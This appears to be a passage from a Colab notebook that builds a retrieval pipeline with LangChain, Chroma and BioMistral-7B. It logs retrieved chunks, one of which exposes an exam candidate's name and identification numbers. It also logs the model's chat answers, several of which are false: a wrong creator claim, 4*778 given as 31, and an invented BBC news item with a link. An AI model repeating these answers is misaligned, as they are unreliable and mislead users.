              "version_minor": 0,
              "model_id": "9304ecfbd0ad4b4d81a9890b6fa21157"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json:   0%|          | 0.00/366 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "0f7b499ababc42f2b90edb031e4c74d8"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.txt:   0%|          | 0.00/232k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "f2db535c0f0e42cb88a604a993a8b566"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer.json:   0%|          | 0.00/711k [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "bfea642b4adf4027bb05d0e96587183f"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "special_tokens_map.json:   0%|          | 0.00/125 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "f380c6fcadef43e3b2c70f52d231c829"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "1_Pooling/config.json:   0%|          | 0.00/190 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "3589081a351e403cb5154f2866226b97"
            }
          },
          "metadata": {}
        }
      ],
      "source": [
        "embeddings = HuggingFaceEmbeddings(model_name=\"BAAI/bge-base-en-v1.5\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wxL78Mn0P3N2"
      },
      "source": [
        "## Embeddings"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cJMgeAOrQfuk"
      },
      "source": [
        "## Vector Store - FAISS or ChromaDB"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 17,
      "metadata": {
        "id": "_rMc5YphQiFA"
      },
      "outputs": [],
      "source": [
        "vectorstore = Chroma.from_documents(chunks, embeddings)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 18,
      "metadata": {
        "id": "FmJth21AQx8V",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "67419ccd-0e3b-47f5-e5f1-b70aed224fcb"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<langchain_community.vectorstores.chroma.Chroma at 0x7ef3a82f1300>"
            ]
          },
          "metadata": {},
          "execution_count": 18
        }
      ],
      "source": [
        "vectorstore"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 19,
      "metadata": {
        "id": "MxUNoeFeR7-u"
      },
      "outputs": [],
      "source": [
        "query = \"Result\" # what is at risk of heart disease\n",
        "search = vectorstore.similarity_search(query)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 20,
      "metadata": {
        "id": "45HgM9wsSCKH",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 62
        },
        "outputId": "39da0f5b-12b1-40a6-f21e-8d485b1b5ad1"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<IPython.core.display.Markdown object>"
            ],
            "text/markdown": "> Marks in PWT 66\n> Result for PWT Qualiﬁed\n> Download another Result  Print\n> Download cop y of OMR shee"
          },
          "metadata": {},
          "execution_count": 20
        }
      ],
      "source": [
        "to_markdown(search[0].page_content)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4mVaIlkZRiXk"
      },
      "source": [
        "## Retriever"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 21,
      "metadata": {
        "id": "rK67OkSQRbnk"
      },
      "outputs": [],
      "source": [
        "retriever = vectorstore.as_retriever(\n",
        "    search_kwargs={'k': 5}\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 22,
      "metadata": {
        "id": "HC4Xly8XSf26",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "ef171b98-0418-4a75-ed50-2185ae997bfb"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-22-162c3489abc9>:1: LangChainDeprecationWarning: The method `BaseRetriever.get_relevant_documents` was deprecated in langchain-core 0.1.46 and will be removed in 1.0. Use invoke instead.\n",
            "  retriever.get_relevant_documents(query)\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[Document(metadata={'page': 0, 'source': '/content/drive/MyDrive/Pdf/https___slprb.ap.gov.in_UI_PCResults (2).pdf'}, page_content='Marks in PWT 66\\nResult for PWT Qualiﬁed\\nDownload another Result  Print\\nDownload cop y of OMR shee'),\n",
              " Document(metadata={'page': 43, 'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf'}, page_content='all these results, and you don’t have your Inter -\\nnet every time to go a website and start search -\\ning for the results. The tool that I am using here is \\n“dmitry” which is completely based on command \\nline but very easy to use and even give the results \\nfaster and accurate.'),\n",
              " Document(metadata={'page': 0, 'source': '/content/drive/MyDrive/Pdf/https___slprb.ap.gov.in_UI_PCResults (2).pdf'}, page_content='Registr ation Number:4 1 5 9 2 1 6   \\nEnter PWT Hall Tick et Number : 5 5 6 1 2 9 0 3 8 4  \\nGener ate New Image\\nType the code from\\nthe image\\n \\nSubmit\\n\\xa0\\xa0 \\xa0\\xa0\\nRegistr ation Number 4159216\\nName of the Candidate SUNNAM SEETHARAM\\nGender Male\\nMarks in PWT 66\\nResult for PWT Qualiﬁed'),\n",
              " Document(metadata={'page': 0, 'source': '/content/drive/MyDrive/Pdf/4159216.pdf'}, page_content='include New Test Centres, if \\nnecessary)\\n1st\\n:\\nRAJAMAHENDRAVARAM\\n2nd\\n:\\nELURU\\n3rd\\n:\\nTADEPALLIGUDEM\\n22.\\nPost Preferences as per notification\\n1st\\n:\\n21 - SCT PC (Civil) (Men & \\nWomen)\\n2nd\\n:\\n23 - SCT PC (APSP) (Men)\\n23.\\nWhich is your preferred place for \\nappearing in PMT / PET after you'),\n",
              " Document(metadata={'page': 0, 'source': '/content/drive/MyDrive/Pdf/4159216.pdf'}, page_content='submitted \\ncorrect \\ninformation \\nto \\nthe \\nbest \\nof \\nmy \\nknowledge \\nand \\nbelief.\\nNote: \\nPlease \\ndownload \\nHall \\nTicket \\nto \\nhave \\naccess \\nto \\nthe \\nExamination \\nCentre. \\nThe \\nHall \\nTickets \\nwill \\nbe \\navailable \\nfor \\ndownload \\nfrom \\nthe \\nwebsite \\n14\\ndays \\nprior \\nto \\nthe \\nDate \\nof \\nExamination.')]"
            ]
          },
          "metadata": {},
          "execution_count": 22
        }
      ],
      "source": [
        "retriever.get_relevant_documents(query)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "al9E1TqMS7Mq"
      },
      "source": [
        "## Large Language Model - Open Source"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 23,
      "metadata": {
        "id": "CIiVtQ17N1Pq",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "d17c3776-dc43-404d-88ae-9fe8de2c8cd8"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount(\"/content/drive\", force_remount=True).\n"
          ]
        }
      ],
      "source": [
        "drive.mount('/content/drive')"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 24,
      "metadata": {
        "id": "MKDFEMDSS9ri",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "3ec8f9f0-0318-43e5-dad6-7c7a32d3b645"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "llama_model_loader: loaded meta data with 21 key-value pairs and 291 tensors from /content/drive/MyDrive/Pdf/Bio/BioMistral-7B.Q4_K_M.gguf (version GGUF V3 (latest))\n",
            "llama_model_loader: Dumping metadata keys/values. Note: KV overrides do not apply in this output.\n",
            "llama_model_loader: - kv   0:                       general.architecture str              = llama\n",
            "llama_model_loader: - kv   1:                               general.name str              = hub\n",
            "llama_model_loader: - kv   2:                       llama.context_length u32              = 32768\n",
            "llama_model_loader: - kv   3:                     llama.embedding_length u32              = 4096\n",
            "llama_model_loader: - kv   4:                          llama.block_count u32              = 32\n",
            "llama_model_loader: - kv   5:                  llama.feed_forward_length u32              = 14336\n",
            "llama_model_loader: - kv   6:                 llama.rope.dimension_count u32              = 128\n",
            "llama_model_loader: - kv   7:                 llama.attention.head_count u32              = 32\n",
            "llama_model_loader: - kv   8:              llama.attention.head_count_kv u32              = 8\n",
            "llama_model_loader: - kv   9:     llama.attention.layer_norm_rms_epsilon f32              = 0.000010\n",
            "llama_model_loader: - kv  10:                       llama.rope.freq_base f32              = 10000.000000\n",
            "llama_model_loader: - kv  11:                          general.file_type u32              = 15\n",
            "llama_model_loader: - kv  12:                       tokenizer.ggml.model str              = llama\n",
            "llama_model_loader: - kv  13:                      tokenizer.ggml.tokens arr[str,32000]   = [\"<unk>\", \"<s>\", \"</s>\", \"<0x00>\", \"<...\n",
            "llama_model_loader: - kv  14:                      tokenizer.ggml.scores arr[f32,32000]   = [0.000000, 0.000000, 0.000000, 0.0000...\n",
            "llama_model_loader: - kv  15:                  tokenizer.ggml.token_type arr[i32,32000]   = [2, 3, 3, 6, 6, 6, 6, 6, 6, 6, 6, 6, ...\n",
            "llama_model_loader: - kv  16:                tokenizer.ggml.bos_token_id u32              = 1\n",
            "llama_model_loader: - kv  17:                tokenizer.ggml.eos_token_id u32              = 2\n",
            "llama_model_loader: - kv  18:            tokenizer.ggml.unknown_token_id u32              = 0\n",
            "llama_model_loader: - kv  19:                    tokenizer.chat_template str              = {{ bos_token }}{% for message in mess...\n",
            "llama_model_loader: - kv  20:               general.quantization_version u32              = 2\n",
            "llama_model_loader: - type  f32:   65 tensors\n",
            "llama_model_loader: - type q4_K:  193 tensors\n",
            "llama_model_loader: - type q6_K:   33 tensors\n",
            "llm_load_vocab: special tokens cache size = 3\n",
            "llm_load_vocab: token to piece cache size = 0.1637 MB\n",
            "llm_load_print_meta: format           = GGUF V3 (latest)\n",
            "llm_load_print_meta: arch             = llama\n",
            "llm_load_print_meta: vocab type       = SPM\n",
            "llm_load_print_meta: n_vocab          = 32000\n",
            "llm_load_print_meta: n_merges         = 0\n",
            "llm_load_print_meta: vocab_only       = 0\n",
            "llm_load_print_meta: n_ctx_train      = 32768\n",
            "llm_load_print_meta: n_embd           = 4096\n",
            "llm_load_print_meta: n_layer          = 32\n",
            "llm_load_print_meta: n_head           = 32\n",
            "llm_load_print_meta: n_head_kv        = 8\n",
            "llm_load_print_meta: n_rot            = 128\n",
            "llm_load_print_meta: n_swa            = 0\n",
            "llm_load_print_meta: n_embd_head_k    = 128\n",
            "llm_load_print_meta: n_embd_head_v    = 128\n",
            "llm_load_print_meta: n_gqa            = 4\n",
            "llm_load_print_meta: n_embd_k_gqa     = 1024\n",
            "llm_load_print_meta: n_embd_v_gqa     = 1024\n",
            "llm_load_print_meta: f_norm_eps       = 0.0e+00\n",
            "llm_load_print_meta: f_norm_rms_eps   = 1.0e-05\n",
            "llm_load_print_meta: f_clamp_kqv      = 0.0e+00\n",
            "llm_load_print_meta: f_max_alibi_bias = 0.0e+00\n",
            "llm_load_print_meta: f_logit_scale    = 0.0e+00\n",
            "llm_load_print_meta: n_ff             = 14336\n",
            "llm_load_print_meta: n_expert         = 0\n",
            "llm_load_print_meta: n_expert_used    = 0\n",
            "llm_load_print_meta: causal attn      = 1\n",
            "llm_load_print_meta: pooling type     = 0\n",
            "llm_load_print_meta: rope type        = 0\n",
            "llm_load_print_meta: rope scaling     = linear\n",
            "llm_load_print_meta: freq_base_train  = 10000.0\n",
            "llm_load_print_meta: freq_scale_train = 1\n",
            "llm_load_print_meta: n_ctx_orig_yarn  = 32768\n",
            "llm_load_print_meta: rope_finetuned   = unknown\n",
            "llm_load_print_meta: ssm_d_conv       = 0\n",
            "llm_load_print_meta: ssm_d_inner      = 0\n",
            "llm_load_print_meta: ssm_d_state      = 0\n",
            "llm_load_print_meta: ssm_dt_rank      = 0\n",
            "llm_load_print_meta: ssm_dt_b_c_rms   = 0\n",
            "llm_load_print_meta: model type       = 7B\n",
            "llm_load_print_meta: model ftype      = Q4_K - Medium\n",
            "llm_load_print_meta: model params     = 7.24 B\n",
            "llm_load_print_meta: model size       = 4.07 GiB (4.83 BPW) \n",
            "llm_load_print_meta: general.name     = hub\n",
            "llm_load_print_meta: BOS token        = 1 '<s>'\n",
            "llm_load_print_meta: EOS token        = 2 '</s>'\n",
            "llm_load_print_meta: UNK token        = 0 '<unk>'\n",
            "llm_load_print_meta: LF token         = 13 '<0x0A>'\n",
            "llm_load_print_meta: max token length = 48\n",
            "llm_load_tensors: ggml ctx size =    0.14 MiB\n",
            "llm_load_tensors:        CPU buffer size =  4165.37 MiB\n",
            ".................................................................................................\n",
            "llama_new_context_with_model: n_batch is less than GGML_KQ_MASK_PAD - increasing to 32\n",
            "llama_new_context_with_model: n_ctx      = 512\n",
            "llama_new_context_with_model: n_batch    = 32\n",
            "llama_new_context_with_model: n_ubatch   = 32\n",
            "llama_new_context_with_model: flash_attn = 0\n",
            "llama_new_context_with_model: freq_base  = 10000.0\n",
            "llama_new_context_with_model: freq_scale = 1\n",
            "llama_kv_cache_init:        CPU KV buffer size =    64.00 MiB\n",
            "llama_new_context_with_model: KV self size  =   64.00 MiB, K (f16):   32.00 MiB, V (f16):   32.00 MiB\n",
            "llama_new_context_with_model:        CPU  output buffer size =     0.12 MiB\n",
            "llama_new_context_with_model:        CPU compute buffer size =     5.06 MiB\n",
            "llama_new_context_with_model: graph nodes  = 1030\n",
            "llama_new_context_with_model: graph splits = 1\n",
            "AVX = 1 | AVX_VNNI = 0 | AVX2 = 1 | AVX512 = 0 | AVX512_VBMI = 0 | AVX512_VNNI = 0 | AVX512_BF16 = 0 | FMA = 1 | NEON = 0 | SVE = 0 | ARM_FMA = 0 | F16C = 1 | FP16_VA = 0 | WASM_SIMD = 0 | BLAS = 0 | SSE3 = 1 | SSSE3 = 1 | VSX = 0 | MATMUL_INT8 = 0 | LLAMAFILE = 1 | \n",
            "Model metadata: {'tokenizer.chat_template': \"{{ bos_token }}{% for message in messages %}{% if (message['role'] == 'user') != (loop.index0 % 2 == 0) %}{{ raise_exception('Conversation roles must alternate user/assistant/user/assistant/...') }}{% endif %}{% if message['role'] == 'user' %}{{ '[INST] ' + message['content'] + ' [/INST]' }}{% elif message['role'] == 'assistant' %}{{ message['content'] + eos_token + ' ' }}{% else %}{{ raise_exception('Only user and assistant roles are supported!') }}{% endif %}{% endfor %}\", 'tokenizer.ggml.unknown_token_id': '0', 'tokenizer.ggml.eos_token_id': '2', 'general.architecture': 'llama', 'llama.rope.freq_base': '10000.000000', 'llama.context_length': '32768', 'general.name': 'hub', 'llama.embedding_length': '4096', 'llama.feed_forward_length': '14336', 'llama.attention.layer_norm_rms_epsilon': '0.000010', 'llama.rope.dimension_count': '128', 'tokenizer.ggml.bos_token_id': '1', 'llama.attention.head_count': '32', 'llama.block_count': '32', 'llama.attention.head_count_kv': '8', 'general.quantization_version': '2', 'tokenizer.ggml.model': 'llama', 'general.file_type': '15'}\n",
            "Available chat formats from metadata: chat_template.default\n",
            "Guessed chat format: mistral-instruct\n"
          ]
        }
      ],
      "source": [
        "llm = LlamaCpp(\n",
        "    model_path= \"/content/drive/MyDrive/Pdf/Bio/BioMistral-7B.Q4_K_M.gguf\",\n",
        "    temperature=0.3,\n",
        "    max_tokens=2048,\n",
        "    top_p=1)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_dy-nCxqTQTG"
      },
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5Y2ukOe5TS6u"
      },
      "source": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "eOm3anhXTwg-"
      },
      "source": [
        "## RAG Chain"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 25,
      "metadata": {
        "id": "M4dKOO7QUTa0"
      },
      "outputs": [],
      "source": [
        "from langchain.schema.runnable import RunnablePassthrough\n",
        "from langchain.schema.output_parser import StrOutputParser\n",
        "from langchain.prompts import ChatPromptTemplate"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 26,
      "metadata": {
        "id": "aBDfjug4U61T"
      },
      "outputs": [],
      "source": [
        "template = \"\"\"\n",
        "<|context|>\n",
        "You are an AI assistant that follows instruction extremely well.\n",
        "Please be truthful and give direct answers\n",
        "</s>\n",
        "<|user|>\n",
        "{query}\n",
        "</s>\n",
        " <|assistant|>\n",
        "\"\"\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 27,
      "metadata": {
        "id": "oGSLkCc7U8YI"
      },
      "outputs": [],
      "source": [
        "prompt = ChatPromptTemplate.from_template(template)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 28,
      "metadata": {
        "id": "hLfDSrrzU1kE"
      },
      "outputs": [],
      "source": [
        "rag_chain = (\n",
        "    {\"context\": retriever,  \"query\": RunnablePassthrough()}\n",
        "    | prompt\n",
        "    | llm\n",
        "    | StrOutputParser()\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Vp_U-sgabbAh"
      },
      "outputs": [],
      "source": []
    },
    {
      "cell_type": "code",
      "execution_count": 29,
      "metadata": {
        "id": "35B_JEcKVERB",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "d199d142-9295-4736-bfd5-50ab97181002"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "\n",
            "llama_print_timings:        load time =    3111.46 ms\n",
            "llama_print_timings:      sample time =      44.66 ms /    48 runs   (    0.93 ms per token,  1074.79 tokens per second)\n",
            "llama_print_timings: prompt eval time =   24831.94 ms /    55 tokens (  451.49 ms per token,     2.21 tokens per second)\n",
            "llama_print_timings:        eval time =   32380.35 ms /    47 runs   (  688.94 ms per token,     1.45 tokens per second)\n",
            "llama_print_timings:       total time =   57309.97 ms /   102 tokens\n"
          ]
        }
      ],
      "source": [
        "response = rag_chain.invoke(\"what disease ?\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 30,
      "metadata": {
        "id": "uyor1d0xVHnW",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 80
        },
        "outputId": "651c3aec-1284-4eb8-f76a-163edf471359"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<IPython.core.display.Markdown object>"
            ],
            "text/markdown": "> I am sorry, I do not have the latest information about COVID-19. Please check the official website of WHO for the most accurate information. Thank you for using me as your AI language model. Have a nice day!"
          },
          "metadata": {},
          "execution_count": 30
        }
      ],
      "source": [
        "to_markdown(response)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 31,
      "metadata": {
        "id": "szG5MJhzORkC",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "outputId": "bdc80b07-a9e9-4a72-ee7d-693d060e6a74"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Input Prompt: hi\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 12 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    3111.46 ms\n",
            "llama_print_timings:      sample time =       5.69 ms /    10 runs   (    0.57 ms per token,  1756.23 tokens per second)\n",
            "llama_print_timings: prompt eval time =    4333.01 ms /    12 tokens (  361.08 ms per token,     2.77 tokens per second)\n",
            "llama_print_timings:        eval time =    6348.14 ms /     9 runs   (  705.35 ms per token,     1.42 tokens per second)\n",
            "llama_print_timings:       total time =   10699.86 ms /    21 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  Hi! How can I assist you today?\n",
            "Input Prompt: who are you\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 14 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    3111.46 ms\n",
            "llama_print_timings:      sample time =      20.05 ms /    34 runs   (    0.59 ms per token,  1696.01 tokens per second)\n",
            "llama_print_timings: prompt eval time =    5383.22 ms /    14 tokens (  384.52 ms per token,     2.60 tokens per second)\n",
            "llama_print_timings:        eval time =   24294.58 ms /    33 runs   (  736.20 ms per token,     1.36 tokens per second)\n",
            "llama_print_timings:       total time =   29731.42 ms /    47 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  I am a large language model trained by OpenAI. I can answer questions, provide information, and even converse with you. How may I assist you today?\n",
            "Input Prompt: what is AI\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 14 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    3111.46 ms\n",
            "llama_print_timings:      sample time =      40.51 ms /    66 runs   (    0.61 ms per token,  1629.27 tokens per second)\n",
            "llama_print_timings: prompt eval time =    4926.67 ms /    14 tokens (  351.91 ms per token,     2.84 tokens per second)\n",
            "llama_print_timings:        eval time =   42691.23 ms /    65 runs   (  656.79 ms per token,     1.52 tokens per second)\n",
            "llama_print_timings:       total time =   47715.92 ms /    79 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  AI is short for artificial intelligence. It refers to the ability of a computer system to perform tasks that would normally require human-level intelligence, such as understanding natural language, recognizing objects and faces, playing games, or solving problems. AI systems can be classified into different types based on how they process information and make decisions.\n",
            "Input Prompt: 4*778\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 16 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    3111.46 ms\n",
            "llama_print_timings:      sample time =      17.00 ms /    31 runs   (    0.55 ms per token,  1823.10 tokens per second)\n",
            "llama_print_timings: prompt eval time =    7223.21 ms /    16 tokens (  451.45 ms per token,     2.22 tokens per second)\n",
            "llama_print_timings:        eval time =   18684.44 ms /    30 runs   (  622.81 ms per token,     1.61 tokens per second)\n",
            "llama_print_timings:       total time =   25949.53 ms /    46 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:   The answer is 31. 7 x 7 + 8 = 31. Is there anything else I can help you with?\n",
            "Input Prompt: 2+8\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 14 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    3111.46 ms\n",
            "llama_print_timings:      sample time =       9.91 ms /    18 runs   (    0.55 ms per token,  1815.80 tokens per second)\n",
            "llama_print_timings: prompt eval time =    7581.02 ms /    14 tokens (  541.50 ms per token,     1.85 tokens per second)\n",
            "llama_print_timings:        eval time =   10077.19 ms /    17 runs   (  592.78 ms per token,     1.69 tokens per second)\n",
            "llama_print_timings:       total time =   17683.08 ms /    31 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:   The answer is 10. Is there anything else I can help you with?\n",
            "Input Prompt: today bbc news telugu\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 18 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    3111.46 ms\n",
            "llama_print_timings:      sample time =      52.67 ms /    85 runs   (    0.62 ms per token,  1613.73 tokens per second)\n",
            "llama_print_timings: prompt eval time =    6830.40 ms /    18 tokens (  379.47 ms per token,     2.64 tokens per second)\n",
            "llama_print_timings:        eval time =   57434.65 ms /    84 runs   (  683.75 ms per token,     1.46 tokens per second)\n",
            "llama_print_timings:       total time =   64404.56 ms /   102 tokens\n"
          ]
        },
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Answer:  Ok, here is the top news from BBC News Telugu: The latest news from BBC News Telugu is about \"Telangana, India: 'Migrant workers face salary cuts and job losses'\". Please listen to this news carefully. The link of the news is https://www.bbc.com/news/world-asia-india-52703106.\n",
            "Input Prompt: who is created you\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Llama.generate: 41 prefix-match hit, remaining 15 prompt tokens to eval\n",
            "\n",
            "llama_print_timings:        load time =    3111.46 ms\n",
            "llama_print_timings:      sample time =      27.67 ms /    48 runs   (    0.58 ms per token,  1734.79 tokens per second)\n",
            "llama_print_timings: prompt eval time =    7841.28 ms /    15 tokens (  522.75 ms per token,     1.91 tokens per second)\n",
            "llama_print_timings:        eval time =   29332.53 ms /    47 runs   (  624.10 ms per token,     1.60 tokens per second)\n",
            "llama_print_timings:       total time =   37240.27 ms /    62 tokens\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Answer:  I am created by the Mistral team at the University of Montreal. They also created me. I was trained on a large corpus of user interactions with other AIs, and then fine-tuned for this specific task.\n"
          ]
        },
        {
          "output_type": "error",
          "ename": "KeyboardInterrupt",
          "evalue": "Interrupted by user",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-31-9593f812be29>\u001b[0m in \u001b[0;36m<cell line: 3>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      3\u001b[0m \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 4\u001b[0;31m   \u001b[0muser_input\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0minput\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"Input Prompt: \"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      5\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0muser_input\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;34m'exit'\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m     \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'Exiting'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/ipykernel/kernelbase.py\u001b[0m in \u001b[0;36mraw_input\u001b[0;34m(self, prompt)\u001b[0m\n\u001b[1;32m    849\u001b[0m                 \u001b[0;34m\"raw_input was called, but this frontend does not support input requests.\"\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    850\u001b[0m             )\n\u001b[0;32m--> 851\u001b[0;31m         return self._input_request(str(prompt),\n\u001b[0m\u001b[1;32m    852\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_parent_ident\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    853\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_parent_header\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.10/dist-packages/ipykernel/kernelbase.py\u001b[0m in \u001b[0;36m_input_request\u001b[0;34m(self, prompt, ident, parent, password)\u001b[0m\n\u001b[1;32m    893\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mKeyboardInterrupt\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    894\u001b[0m                 \u001b[0;31m# re-raise KeyboardInterrupt, to truncate traceback\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 895\u001b[0;31m                 \u001b[0;32mraise\u001b[0m \u001b[0mKeyboardInterrupt\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Interrupted by user\"\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    896\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mException\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    897\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mlog\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mwarning\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Invalid Message:\"\u001b[0m\u001b[0;34m,\u001b[0m 